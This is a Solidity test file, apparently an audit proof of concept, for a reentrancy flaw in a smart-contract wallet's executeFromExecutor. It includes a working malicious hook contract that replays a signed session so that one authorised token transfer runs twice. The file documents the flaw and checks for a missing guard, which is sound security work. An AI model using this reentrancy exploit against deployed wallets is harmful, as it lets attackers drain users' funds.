// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

// PoC F2 — MEDIUM-HIGH
// No reentrancy guard on executeFromExecutor — hook replays session
//
// Root cause : validateSession() is view-only; no state is written before
//              the external preHook call. The same still-valid session can
//              be re-entered from inside the hook.
// Impact     : A session whose preHook is a malicious contract executes
//              `calls` twice per invocation (inner + outer _batchCall).
//              Scales to ~1024 call-stack depth in theory.
//
// Run: forge test --match-contract PoC_F2 -vvvv

import "forge-std/Test.sol";
import {IWalletCore} from "src/interfaces/IWalletCore.sol";
import {IExecutor}   from "src/interfaces/IExecutor.sol";
import {IHook}       from "src/interfaces/IHook.sol";
import {MockERC20}   from "src/test/MockERC20.sol";
import {MockExecutor} from "src/test/MockExecutor.sol";
import {Call, Session} from "src/Types.sol";
import {DeployInitHelper, DeployFactory} from "scripts/DeployInitHelper.sol";
import {WalletCore}  from "src/WalletCore.sol";

// ---------------------------------------------------------------------------
// Malicious hook: on first preCheck, re-enters executeFromExecutor with the
// same session (still valid — validateSession is view, no state written).
// Result: _batchCall executes on the inner call, then again on the outer call.
// ---------------------------------------------------------------------------
contract ReentrantHook is IHook {
    IWalletCore public wallet;
    bool        private _entered;

    Call[]   internal _calls;
    Session  internal _session;

    uint256 public invocationCount;

    constructor(address _wallet) {
        wallet = IWalletCore(_wallet);
    }

    function prime(Call[] calldata calls, Session calldata session) external {
        delete _calls;
        for (uint256 i; i < calls.length; i++) _calls.push(calls[i]);
        _session = session;
    }

    function preCheck(
        Call[] calldata,
        bytes  calldata,
        address
    ) external payable returns (bytes memory) {
        invocationCount++;
        if (!_entered) {
            _entered = true;
            // Re-enter: validateSession() still passes (view-only, no state changed)
            wallet.executeFromExecutor(_calls, _session);
        }
        return "";
    }

    function postCheck(
        bytes calldata,
        bytes calldata,
        address
    ) external payable {}
}

contract PoC_F2 is Test {
    string constant NAME    = "wallet-core";
    string constant VERSION = "1.0.0";

    address internal _alice;
    uint256 internal _alicePk;

    WalletCore internal _walletCore;
    DeployFactory public deployFactory;

    MockERC20    token;
    MockExecutor executor;
    ReentrantHook hook;
    address      victim;

    function setUp() public {
        (_alice, _alicePk) = makeAddrAndKey("alice");

        deployFactory = new DeployFactory();
        bytes32 salt  = vm.envBytes32("DEPLOY_FACTORY_SALT");

        (,, address walletAddr) = DeployInitHelper.deployContracts(
            deployFactory, salt, NAME, VERSION
        );
        _walletCore = WalletCore(payable(walletAddr));

        vm.etch(_alice, address(_walletCore).code);
        deal(_alice, 10 ether);
        vm.prank(_alice);
        IWalletCore(_alice).initialize();

        vm.prank(_alice);
        token    = new MockERC20();
        executor = new MockExecutor(IWalletCore(_alice));
        hook     = new ReentrantHook(_alice);
        victim   = makeAddr("victim");
    }

    function _sign(Session memory s) internal view returns (Session memory) {
        bytes32 h = IExecutor(_alice).getSessionTypedHash(s);
        (uint8 v, bytes32 r, bytes32 ss) = vm.sign(_alicePk, h);
        s.signature = abi.encodePacked(r, ss, v);
        return s;
    }

    // ------------------------------------------------------------------
    // Test: one executeFromExecutor call triggers _batchCall twice
    // because the preHook re-enters with the same valid session.
    // Expected without guard : victim receives 200 tokens (2 × 100)
    // Expected with guard    : victim receives 100 tokens (reverts on re-entry)
    // ------------------------------------------------------------------
    function test_f2_hook_reentrancy_doubles_transfer() public {
        deal(address(token), _alice, 1_000e18);

        // Build the transfer call: 100 tokens to victim
        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: address(token),
            value:  0,
            data:   abi.encodeWithSignature(
                        "transfer(address,uint256)", victim, 100e18
                    )
        });

        // hookBytes: 20-byte address prefix (required by onlyValidSession)
        bytes memory hookBytes = abi.encodePacked(address(hook));

        Session memory s = _sign(Session({
            id:         10,
            executor:   address(executor),
            validator:  address(1),
            validUntil: block.timestamp + 1000,
            validAfter: 0,
            preHook:    hookBytes,   // ← malicious hook
            postHook:   "",
            signature:  ""
        }));

        // Prime hook with the signed session so it can replay it
        hook.prime(calls, s);

        uint256 aliceBefore = token.balanceOf(_alice);

        // Single executeFromExecutor call from the executor
        executor.execute(calls, s);

        // Without reentrancy guard: transfer ran twice → victim has 200
        uint256 victimBalance = token.balanceOf(victim);
        assertEq(
            victimBalance,
            200e18,
            "F2: expected 200 tokens (2x via reentrancy); reentrancy guard absent"
        );
        assertEq(
            token.balanceOf(_alice),
            aliceBefore - 200e18,
            "F2: Alice balance mismatch"
        );

        console.log("[F2] preHook invocation count :", hook.invocationCount());
        console.log("[F2] Expected single transfer  : 100 tokens");
        console.log("[F2] Actual (reentered)        :", victimBalance / 1e18, "tokens");
    }
}
